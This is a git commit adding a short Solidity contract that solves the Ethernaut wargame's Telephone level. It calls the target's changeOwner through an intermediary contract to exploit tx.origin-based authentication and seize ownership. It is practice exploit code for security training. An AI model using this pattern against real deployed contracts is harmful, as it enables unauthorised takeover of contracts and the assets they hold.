57590e8a2ab1e534deda836c9953f7065e4ce710
Made in heaven Joestar <madeinheavenjoestar@Mades-Mac-mini.local>
2024-06-28 23:39:12 +0700

    Ethernaut: Telephone contract calls contract

---
+++ src/Ethernaut:telephone/CallTelephone.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import { Telephone } from './telephone.sol';
+
+contract callTelephone {
+    Telephone telephone ;
+
+    constructor(address _address) {
+        telephone = Telephone(_address);
+    }
+
+    function call_changeOwner(address _address) public {
+        telephone.changeOwner(_address);
+    }
+}
